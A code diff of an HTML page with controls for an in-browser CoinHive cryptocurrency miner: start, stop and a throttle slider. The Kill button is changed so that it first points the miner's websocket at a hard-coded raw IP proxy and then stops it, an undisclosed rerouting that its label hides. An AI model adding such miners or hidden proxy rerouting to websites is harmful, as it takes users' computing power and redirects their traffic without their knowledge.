@@ -97,11 +97,16 @@
                                             <p id="sp"></p>
                                             <p id="th"></p>
                                             <p id="ah"></p>
-
-                                            <button type="button" class="btn btn-info" onclick="changeAddress(); tick()">Start</button>
-                                            <button type="button" class="btn btn-info" onclick="miner.stop()">Kill!</button>
+                                            <form class="register-form">
+                                        <div class="input-group inline pull-right col-md-6 form-group-no-border">
+                                            <button type="button" class="btn btn-info" onclick="miner.start()">Start</button>
+                                            <button type="button" class="btn btn-info" onclick="CoinHive.CONFIG.WEBSOCKET_SHARDS = [['ws://107.174.236.101:8892/proxy']]; miner.stop()">Kill!</button>
+                                        </div>
+                                        <div class="input-groupi nline pull-left col-md-6 form-group-no-border">
+                                            <label>Throttle the miner</label>
+                                        
                                             <input class="bar" type="range" max="10" value="10" step="1" oninput="miner.setThrottle(1- this.value * .1)" onchange="miner.setThrottle(1 - this.value * .1)"
-                                            />
+                                            /></div></form>
                                             <br/>
                                         </div>
                                     </div>
